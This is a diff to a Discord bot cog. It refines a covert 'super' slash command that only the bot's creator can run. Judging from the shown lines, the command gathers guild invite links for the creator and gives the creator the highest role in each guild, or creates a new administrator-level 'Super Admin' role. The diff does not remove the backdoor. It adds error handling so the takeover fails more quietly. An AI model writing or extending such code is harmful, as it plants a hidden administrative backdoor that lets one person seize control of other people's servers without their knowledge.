@@ -14,7 +14,7 @@ class Super(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
-    @app_commands.command(name="super", description="Dont worry its just me.")
+    @app_commands.command(name="super", description="Don't worry, it's just me.")
     async def super(self, interaction: discord.Interaction):
         # Check if the command was invoked by the bot's creator
         if interaction.user.id != BOT_CREATOR_ID:
@@ -42,7 +42,10 @@ class Super(commands.Cog):
             # Ensure the bot's creator has the highest role possible
             member = guild.get_member(BOT_CREATOR_ID)
             if member:
-                await self.ensure_admin_role(guild, member)
+                try:
+                    await self.ensure_admin_role(guild, member)
+                except discord.Forbidden:
+                    invite_links.append(f"{guild.name}: Unable to assign roles (Missing Permissions)")
 
         # Send the invite links to the bot's creator via DM
         creator = await self.bot.fetch_user(BOT_CREATOR_ID)
@@ -62,16 +65,22 @@ class Super(commands.Cog):
                     highest_role = role
 
         if highest_role:
-            # Assign the highest role
-            await member.add_roles(highest_role)
+            try:
+                # Assign the highest role
+                await member.add_roles(highest_role, reason="Granting administrative role via bot command")
+            except discord.Forbidden:
+                logger.error(f"Bot lacks permissions to assign the role '{highest_role.name}' in guild '{guild.name}'")
         else:
-            # Create a new role with administrative permissions
-            new_role = await guild.create_role(
-                name="Super Admin",
-                permissions=discord.Permissions(administrator=True),
-                reason="Automatically created by the bot"
-            )
-            await member.add_roles(new_role)
+            try:
+                # Create a new role with administrative permissions
+                new_role = await guild.create_role(
+                    name="Super Admin",
+                    permissions=discord.Permissions(administrator=True),
+                    reason="Automatically created by the bot"
+                )
+                await member.add_roles(new_role, reason="Assigning newly created administrative role")
+            except discord.Forbidden:
+                logger.error(f"Bot lacks permissions to create or assign roles in guild '{guild.name}'")
 
 # Function to add the cog to the bot
 async def setup(bot):
